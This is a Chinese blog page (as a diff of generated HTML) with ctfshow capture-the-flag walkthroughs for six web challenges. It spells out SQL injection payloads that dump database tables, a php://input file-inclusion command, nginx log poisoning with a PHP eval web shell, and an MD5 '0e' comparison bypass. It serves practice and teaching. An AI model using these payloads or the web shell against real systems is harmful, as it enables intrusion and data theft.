@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="ctfshow web1查看源码，base64解码得flag web2构造SQL注入语句，这是一个登录功能，那应该考虑是字符串注入，在username后面加上 &#39; or 1&#x3D;1  #发送 成功登录。证明构造的语句没有问题，接下来就是一把梭，猜解字段数、获取数据库名、获取表名、获取字段、拿到flag！ &#39;username&#x3D;ctfshow&#39; order by 3  #&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow">
+<meta property="og:url" content="http://example.com/2023/08/17/ctfshow/index.html">
+<meta property="og:site_name" content="Konglong">
+<meta property="og:description" content="ctfshow web1查看源码，base64解码得flag web2构造SQL注入语句，这是一个登录功能，那应该考虑是字符串注入，在username后面加上 &#39; or 1&#x3D;1  #发送 成功登录。证明构造的语句没有问题，接下来就是一把梭，猜解字段数、获取数据库名、获取表名、获取字段、拿到flag！ &#39;username&#x3D;ctfshow&#39; order by 3  #&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:\Users\%E9%99%88\AppData\Roaming\Typora\typora-user-images\image-20230817104534044.png">
+<meta property="og:image" content="c:\Users\%E9%99%88\AppData\Roaming\Typora\typora-user-images\image-20230817105306721.png">
+<meta property="og:image" content="c:\Users\%E9%99%88\AppData\Roaming\Typora\typora-user-images\image-20230817105325864.png">
+<meta property="article:published_time" content="2023-08-17T02:27:07.000Z">
+<meta property="article:modified_time" content="2023-08-17T03:15:49.402Z">
+<meta property="article:author" content="xuan">
+<meta property="article:tag" content="ctf解题">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:\Users\%E9%99%88\AppData\Roaming\Typora\typora-user-images\image-20230817104534044.png">
+
+
+<link rel="canonical" href="http://example.com/2023/08/17/ctfshow/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/08/17/ctfshow/","path":"2023/08/17/ctfshow/","title":"ctfshow"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ctfshow | Konglong</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Konglong</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web1"><span class="nav-number">1.</span> <span class="nav-text">web1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">2.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web3"><span class="nav-number">3.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web4"><span class="nav-number">4.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web5"><span class="nav-number">5.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web6"><span class="nav-number">6.</span> <span class="nav-text">web6</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xuan"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">xuan</p>
+  <div class="site-description" itemprop="description">Welcome</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xuanhhhhh/xuanhhhhh.github.io" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xuanhhhhh&#x2F;xuanhhhhh.github.io" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:18035748708@163.com" title="E-Mail → mailto:18035748708@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/m0_74080781?type=blog" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_74080781?type&#x3D;blog" rel="noopener me" target="_blank"><i class="fab fa-codiepie fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/17/ctfshow/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="xuan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Konglong">
+      <meta itemprop="description" content="Welcome">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ctfshow | Konglong">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ctfshow
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-08-17 10:27:07 / 修改时间：11:15:49" itemprop="dateCreated datePublished" datetime="2023-08-17T10:27:07+08:00">2023-08-17</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>ctfshow</p>
+<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p>查看源码，base64解码得flag</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>构造SQL注入语句，这是一个登录功能，那应该考虑是字符串注入，在username后面加上<code> &#39; or 1=1  #</code>发送</p>
+<p>成功登录。证明构造的语句没有问题，接下来就是一把梭，猜解字段数、获取数据库名、获取表名、获取字段、拿到flag！</p>
+<p><code>&#39;username=ctfshow&#39; order by 3  #&amp;password=123</code>显示登录成功，</p>
+<p><code>&#39;username=ctfshow&#39; order by 4  #</code>不显示，证明有三个字段。</p>
+<p><code>username=ctfshow&#39; union select 1,2,3  #&amp;password=123</code>确定回显位置，看到2显示在了页面上，利用2这个位置继续搞。</p>
+<p><code>username=ctfshow&#39; union select 1,database(),3  #&amp;password=123</code>获取到数据库名</p>
+<p><code>username=ctfshow&#39; union select 1,group_concat(table_name),3  from information_schema.tables where table_schema=&#39;web2&#39;   #&amp;password=123</code> 获取数据库的表名，找到flag表啦</p>
+<p><code>username=ctfshow&#39; union select 1,group_concat(column_name),3  from information_schema.columns where table_name=&#39;flag&#39;   #&amp;password=123</code>获取flag表中的字段名</p>
+<p><code>username=ctfshow&#39; union select 1,group_concat(flag),3 from flag  #&amp;password=123</code>获取flag！</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>php伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf.show_web3</span><br><span class="line">&lt;?php include($_GET[&#x27;url&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 页面中显示了部分源码,明显是引导我们利用文件包含漏洞进行操作,源码中的include()函数通过GET请求接收一个url参数,那接下来我们就给它传递一个url参数</p>
+<p>使用Burp Suite抓包,利用php:&#x2F;&#x2F;input伪协议执行PHP代码,代码的内容为执行系统命令,查看当前目录下所有文件</p>
+<pre><code>?url=php://input        -- GET请求的url中拼接伪协议
+&lt;?php system(&#39;ls&#39;)?&gt;    -- post请求内容构造需要执行的代码
+</code></pre>
+<p>得到crf_go_go_go index.php，该文件就是存放flag的文件</p>
+<p>我们直接在url地址栏中拼接url参数,访问crf_go_go_go文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=ctf_go_go_go</span><br></pre></td></tr></table></figure>
+
+<p>成功获取flag</p>
+<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>日志注入</p>
+<p> ($_GET[‘url’])可看出存在文件包含漏洞</p>
+<p>F12打开网络栏，可以看到Server里面是nginx，尝试一下日志注入</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817104534044.png" alt="image-20230817104534044"></p>
+<p> nginx服务器默认日志位置在</p>
+<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>在url后面输入查看一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p> 发现可以</p>
+<p>用Burp Suite抓包，在User-Agent后面写个🐎</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 放包，注意看日志下面这时多出来一条</p>
+<p>此时木马已经插入进去了，日志中的代码会被执行但不会显示</p>
+<p>连接蚁剑</p>
+<p>注意URL地址写的是日志地址，因为我们的🐎是传进日志里了</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105306721.png" alt="image-20230817105306721"></p>
+<p>在上层可以看到flag.txt</p>
+<p> <img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230817105325864.png" alt="image-20230817105325864"></p>
+<p> 拿到flag</p>
+<p>ctfshow{05eeaf03-2f53-4cc6-959c-f65fb4a7163a}</p>
+<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>考点：php代码审计</p>
+<pre><code> &lt;?php
+        $flag=&quot;&quot;;
+        $v1=$_GET[&#39;v1&#39;];
+        $v2=$_GET[&#39;v2&#39;];
+        if(isset($v1) &amp;&amp; isset($v2))&#123;
+            if(!ctype_alpha($v1))&#123;
+                die(&quot;v1 error&quot;);
+            &#125;
+            if(!is_numeric($v2))&#123;
+                die(&quot;v2 error&quot;);
+            &#125;
+            if(md5($v1)==md5($v2))&#123;
+                echo $flag;
+            &#125;
+        &#125;else&#123;
+        
+            echo &quot;where is flag?&quot;;
+        &#125;
+    ?&gt;  echo &quot;where is flag?&quot;;
+    &#125;
+?&gt;
+</code></pre>
+<ul>
+<li>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</li>
+<li>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</li>
+</ul>
+<p>这里我们可以使用MD5的0e绕过方式,输入一下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=QNKCDZO&amp;v2=240610708</span><br></pre></td></tr></table></figure>
+
+<p>QNKCDZO 的md5值为 0e830400451993494058024219903391</p>
+<p>240610708 的md5值为 0e462097431906509019562988736854</p>
+<p>分别满足纯字母和数字字符串,并且md5值以0e开头,而0e开头的字符串参与比较(&#x3D;&#x3D;)时,会转化为0,也就是 0&#x3D;&#x3D;0,返回true使if判断成立,从而输出flag</p>
+<p>常用的值：</p>
+<pre><code>开头为0E（MD5值） 字母数字混合类型：
+s878926199a
+0e545993274517709034328855841020
+s155964671a
+0e342768416822451524974117254469
+s214587387a
+0e848240448830537924465865611904
+s214587387a
+0e848240448830537924465865611904
+纯大写字母：
+QLTHNDT
+0e405967825401955372549139051580
+QNKCDZO
+0e830400451993494058024219903391
+EEIZDOI
+0e782601363539291779881938479162
+纯数字：
+240610708
+0e462097431906509019562988736854
+4011627063
+0e485805687034439905938362701775
+4775635065
+0e998212089946640967599450361168
+4790555361
+0e643442214660994430134492464512
+5432453531
+0e512318699085881630861890526097
+5579679820
+0e877622011730221803461740184915
+5585393579
+0e664357355382305805992765337023
+6376552501
+0e165886706997482187870215578015
+7124129977
+0e500007361044747804682122060876
+7197546197
+0e915188576072469101457315675502
+7656486157
+0e451569119711843337267091732412
+</code></pre>
+<p>任意使用2个即可</p>
+<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p>web2的升级版，做了过滤</p>
+<p>一打开页面是用户名密码登录，我们首先第一个想到的就是sql注入了，来用万能钥匙1’ or 1&#x3D;1#试一下，报错了<br>然后，我在密码框里同样注入万能钥匙试了一下，发现，密码框中输入空格也会多一个黑点，于是我猜测可能是把空格过滤了，为了验证 我的猜想，来抓包看一下服务器收到的页面请求包最后传递的用户名和密码的参数值是什么样子的</p>
+<p>抓包果然发现，空格被过滤了</p>
+<p>一般空格被过滤有如下替换方法</p>
+<pre><code>/**/
+()
+回车(url编码中的%0a)
+`(tap键上面的按钮)
+tap
+两个空格
+</code></pre>
+<p>我们就选用&#x2F;**&#x2F;来替换空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/or/**/1=1#</span><br></pre></td></tr></table></figure>
+
+<p>好，登陆成功了</p>
+<p>接下来，来老生常谈的爆库爆表爆字段吧<br><strong>爆库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;/**/union/**/select/**/1,database(),3#&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p>得到数据库名为web2<br><strong>爆表</strong></p>
+<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;password=1
+</code></pre>
+<p>表有flag和user<br><strong>爆字段</strong></p>
+<pre><code>username=1&#39;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name=&#39;flag&#39;#&amp;password=1
+</code></pre>
+<p>列名也为flag<br><strong>爆字段值</strong></p>
+<pre><code>username=1&#39;/**/union/**/select/**/1,flag,3/**/from/**/flag#&amp;password=1
+</code></pre>
+<p>拿到flag</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechat.png" alt="xuan 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/zhifubao.png" alt="xuan 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf%E8%A7%A3%E9%A2%98/" rel="tag"># ctf解题</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/15/dirsearch/" rel="prev" title="dirsearch">
+                  <i class="fa fa-angle-left"></i> dirsearch
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">xuan</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">100k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:01</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
